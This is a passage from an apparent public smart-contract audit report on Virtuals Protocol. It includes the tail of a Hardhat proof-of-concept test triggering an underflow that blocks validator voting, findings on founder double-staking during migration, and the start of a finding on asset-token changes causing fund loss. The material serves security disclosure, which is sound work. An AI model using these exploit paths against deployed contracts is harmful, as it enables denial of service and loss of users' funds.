<span class="grvsc-line"><span class="grvsc-source">      0, // parentId</span></span>
<span class="grvsc-line"><span class="grvsc-source">      true, // isModel</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0 // no datasetId</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 4: Validator1 casts honest forVote with battles results</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const honestVoteParams = abi.encode(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ["uint8[] memory"],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [[0, 0, 0, 0, 0, 0, 1, 0, 1, 0]]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await expect(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      agentDAO</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .connect(validator1)</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .castVoteWithReasonAndParams(</span></span>
<span class="grvsc-line"><span class="grvsc-source">          proposalId2,</span></span>
<span class="grvsc-line"><span class="grvsc-source">          1,</span></span>
<span class="grvsc-line"><span class="grvsc-source">          "Good improvement",</span></span>
<span class="grvsc-line"><span class="grvsc-source">          honestVoteParams</span></span>
<span class="grvsc-line"><span class="grvsc-source">        )</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ).to.be.revertedWithPanic(0x11);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "validator1 vote for proposal2 reverted with 0x11 underflow panic code"</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span></code></pre>
</details>
<p>Test results:</p>
<pre data-index="108" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  RewardsV2</span></span>
<span class="grvsc-line"><span class="grvsc-source">Validator1 votes: 9999999.999999999999999</span></span>
<span class="grvsc-line"><span class="grvsc-source">Base proposal maturity: 100</span></span>
<span class="grvsc-line"><span class="grvsc-source">validator1 vote for proposal2 reverted with 0x11 underflow panic code</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ✔ underflow DOS certain voting (1540ms)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">1 passing (2s)</span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken"><a class="anchor before" aria-label="m 22 founder has to double stake during migration with the initial lp locked in the old vetoken permalink" href="#m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-170">[M-22] Founder has to double-stake during migration with the initial LP locked in the old <code>veToken</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-843">oakcobalt</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-834">gkrastenov</a></em></p>
<p>During the migration process implemented in AgentMigrator.sol, founders face a double-staking problem where their original LP tokens remain locked in the old AgentVeToken contract while they must provide additional virtual tokens for the migration to the new system.</p>
<h3 style="position:relative;" id="vulnerabilities-1"><a class="anchor before" aria-label="vulnerabilities 1 permalink" href="#vulnerabilities-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Vulnerabilities</h3>
<p>The <code>AgentMigrator.migrateAgent()</code> function creates new token, LP, <code>veToken</code>, and DAO contracts but fails to provide a mechanism to migrate the founder’s locked tokens from the old <code>veToken</code> contract:</p>
<pre data-index="109" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">migrateAgent</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">id</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">name</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">symbol</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">canStake</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Deploy Agent token &amp; LP</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1"> = </span><span class="mtk11">_createNewAgentToken</span><span class="mtk1">(</span><span class="mtk12">name</span><span class="mtk1">, </span><span class="mtk12">symbol</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">lp</span><span class="mtk1"> = </span><span class="mtk11">IAgentToken</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">liquidityPools</span><span class="mtk1">()[</span><span class="mtk7">0</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">_assetToken</span><span class="mtk1">).</span><span class="mtk11">transferFrom</span><span class="mtk1">(</span><span class="mtk12">founder</span><span class="mtk1">, </span><span class="mtk12">token</span><span class="mtk1">, </span><span class="mtk12">initialAmount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IAgentToken</span><span class="mtk1">(</span><span class="mtk12">token</span><span class="mtk1">).</span><span class="mtk11">addInitialLiquidity</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Deploy AgentVeToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">veToken</span><span class="mtk1"> = </span><span class="mtk11">_createNewAgentVeToken</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1">.</span><span class="mtk11">concat</span><span class="mtk1">(</span><span class="mtk8">"Staked "</span><span class="mtk1">, </span><span class="mtk12">name</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1">.</span><span class="mtk11">concat</span><span class="mtk1">(</span><span class="mtk8">"s"</span><span class="mtk1">, </span><span class="mtk12">symbol</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">lp</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">founder</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">canStake</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_nft</span><span class="mtk1">.</span><span class="mtk11">migrateVirtual</span><span class="mtk1">(</span><span class="mtk12">id</span><span class="mtk1">, </span><span class="mtk12">dao</span><span class="mtk1">, </span><span class="mtk12">token</span><span class="mtk1">, </span><span class="mtk12">lp</span><span class="mtk1">, </span><span class="mtk12">veToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Stake LP in new veToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">lp</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">veToken</span><span class="mtk1">, </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IAgentVeToken</span><span class="mtk1">(</span><span class="mtk12">veToken</span><span class="mtk1">).</span><span class="mtk11">stake</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">lp</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">founder</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">founder</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentMigrator.sol#L107-L131">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentMigrator.sol#L107-L131</a></p>
<p>Meanwhile, the original LP tokens remain locked in the old <code>veToken</code> due to the withdrawal restriction in <code>AgentVeToken.withdraw()</code>:</p>
<pre data-index="110" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">withdraw</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">sender</span><span class="mtk1"> = </span><span class="mtk11">_msgSender</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">) &gt;= </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk8">"Insufficient balance"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> ((</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">founder</span><span class="mtk1">) &amp;&amp; ((</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">) - </span><span class="mtk12">amount</span><span class="mtk1">) &lt; </span><span class="mtk12">initialLock</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> &gt;= </span><span class="mtk12">matureAt</span><span class="mtk1">, </span><span class="mtk8">"Not mature yet"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L99-L100">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L99-L100</a></p>
<h3 style="position:relative;" id="impact-16"><a class="anchor before" aria-label="impact 16 permalink" href="#impact-16"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Founders must provide duplicate capital (virtual tokens) during migration, as they cannot retrieve their original LP tokens to retrieve originally deposited virtual tokens in the old uniswap pair.</li>
<li>Original LP tokens remain locked in obsolete contracts for 10 years. Due to the bonding curve graduation requirements and genesis requirements, the locked virtual token values are significant (roughly 35000 virtual tokens (35000 usd) required to graduate a bonding curve pair).</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-26"><a class="anchor before" aria-label="recommended mitigation steps 26 permalink" href="#recommended-mitigation-steps-26"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ol>
<li>Modify the AgentMigrator contract to include a mechanism to unlock LP tokens from the old <code>veToken</code> during migration.</li>
<li>Add a privileged function to the AgentVeToken contract that allows the founder to withdraw their locked tokens in case of a migration.</li>
</ol>
<h3 style="position:relative;" id="proof-of-concept-16"><a class="anchor before" aria-label="proof of concept 16 permalink" href="#proof-of-concept-16"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>Founder deployed initial bonding curve.</li>
<li>It requires roughly 35000 virtual tokens (35000 usd) to graduate and deploy agent tokens. At graduation, these are converted to LP tokens and locked in the original veToken, with the founder being unable to withdraw the <code>initialLock</code> amount.</li>
<li>The protocol team deploys new versions of the Agent contracts and encourages migration.</li>
<li>The founder attempts to migrate their Agent using <code>AgentMigrator.migrateAgent()</code>.</li>
<li>The founder must transfer additional virtual tokens to the new token contract to create new LP (assuming around the same amount of virtual tokens are required).</li>
<li>New LP tokens are staked in the new <code>veToken</code>, but the original LP tokens (worth <code>~</code>35,000 usd) remain locked in the old <code>veToken</code>.</li>
<li>The founder now has capital locked in two places - the new <code>veToken</code> (functional) and the old <code>veToken</code> (obsolete).</li>
<li>The founder cannot withdraw their original locked LP until after 10 years from the original deployment date.</li>
</ol>
<hr>
<h2 style="position:relative;" id="m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds"><a class="anchor before" aria-label="m 23 using agentfactorysetassettoken will lead to loss of funds permalink" href="#m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-180">[M-23] Using <code>AgentFactory::setAssetToken</code> will lead to loss of funds</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-729">YouCrossTheLineAlfie</a></em></p>
<p>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L123"><code>AgentFactory::assetToken</code></a> is initially set upon early <code>initialize</code> call:</p>
<pre data-index="111" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// AgentFactory.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">initialize</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">initializer</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">__Pausable_init</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">tokenImplementation</span><span class="mtk1"> = </span><span class="mtk12">tokenImplementation_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">veTokenImplementation</span><span class="mtk1"> = </span><span class="mtk12">veTokenImplementation_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">daoImplementation</span><span class="mtk1"> = </span><span class="mtk12">daoImplementation_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">assetToken</span><span class="mtk1"> = </span><span class="mtk12">assetToken_</span><span class="mtk1">;                       &lt;&lt;@ -- </span><span class="mtk3">// Sets assetToken initially</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">tbaRegistry</span><span class="mtk1"> = </span><span class="mtk12">tbaRegistry_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">nft</span><span class="mtk1"> = </span><span class="mtk12">nft_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">applicationThreshold</span><span class="mtk1"> = </span><span class="mtk12">applicationThreshold_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_nextId</span><span class="mtk1"> = </span><span class="mtk7">1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_grantRole</span><span class="mtk1">(</span><span class="mtk12">DEFAULT_ADMIN_ROLE</span><span class="mtk1">, </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_vault</span><span class="mtk1"> = </span><span class="mtk12">vault_</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This <code>assetToken</code> is being used inside <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L196"><code>AgentFactory::executeApplication</code></a>, <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L288"><code>AgentFactory::_createNewAgentToken</code></a> and <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L179"><code>AgentFactory::withdraw</code></a>.</p>
<p>However, changing this <code>assetToken</code> via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L388"><code>AgentFactory::setAssetToken</code></a> has serious complications;</p>
<pre data-index="112" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setAssetToken</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">newToken</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">onlyRole</span><span class="mtk1">(</span><span class="mtk12">DEFAULT_ADMIN_ROLE</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">assetToken</span><span class="mtk1"> = </span><span class="mtk12">newToken</span><span class="mtk1">;          &lt;&lt;@ -- </span><span class="mtk3">// Sets `assetToken`</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>These issues are described below:</p>
<ol>
<li><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L179"><code>AgentFactory::withdraw</code></a> function would fail as the new <code>assetToken</code> will be different from the funds held by the contract during <code>proposeAgent</code> call.</li>
</ol>
<pre data-index="113" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">withdraw</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">id</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">Application</span><span class="mtk1"> </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">application</span><span class="mtk1"> = </span><span class="mtk12">_applications</span><span class="mtk1">[</span><span class="mtk12">id</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">proposer</span><span class="mtk1"> || </span><span class="mtk11">hasRole</span><span class="mtk1">(</span><span class="mtk12">WITHDRAW_ROLE</span><span class="mtk1">, </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">), </span><span class="mtk8">"Not proposer"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">status</span><span class="mtk1"> == </span><span class="mtk12">ApplicationStatus</span><span class="mtk1">.</span><span class="mtk12">Active</span><span class="mtk1">, </span><span class="mtk8">"Application is not active"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">number</span><span class="mtk1"> &gt; </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">proposalEndBlock</span><span class="mtk1">, </span><span class="mtk8">"Application is not matured yet"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">withdrawableAmount</span><span class="mtk1"> = </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">withdrawableAmount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">withdrawableAmount</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">status</span><span class="mtk1"> = </span><span class="mtk12">ApplicationStatus</span><span class="mtk1">.</span><span class="mtk12">Withdrawn</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">safeTransfer</span><span class="mtk1">(</span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">proposer</span><span class="mtk1">, </span><span class="mtk12">withdrawableAmount</span><span class="mtk1">);      &lt;&lt;@ -- </span><span class="mtk3">// Would break due to different assetToken than upon proposal</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<ol start="2">
